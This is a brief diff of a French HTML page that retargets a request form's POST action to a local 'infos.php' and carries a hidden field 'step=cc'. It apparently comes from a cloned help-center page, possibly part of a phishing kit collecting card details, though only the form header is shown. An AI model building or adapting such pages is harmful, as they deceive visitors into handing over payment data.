@@ -1,4 +1,4 @@
-
+﻿
 
 <html lang="fr-FR">
 
@@ -84,7 +84,7 @@
 
 				</h1>
 				<div class="form">
-					<form class="request-form" data-form="" data-form-type="request" action="../infos.php" accept-charset="UTF-8" method="post">
+					<form class="request-form" data-form="" data-form-type="request" action="infos.php" accept-charset="UTF-8" method="post">
 						<input name="utf8" type="hidden" value="✓">
 						<input type="hidden" name="step" value="cc">
 						<input type="hidden" name="authenticity_token" value="hc:requests:client:pTz2IwvtTEM2tIWkmr8pkClV1r0WyqSBio-7OSNPEhN6iayQ1pTPfE69Kz8RWVoRd8MiG-sv7Zt8IiqIWVin_w" data-hc-status="ready">
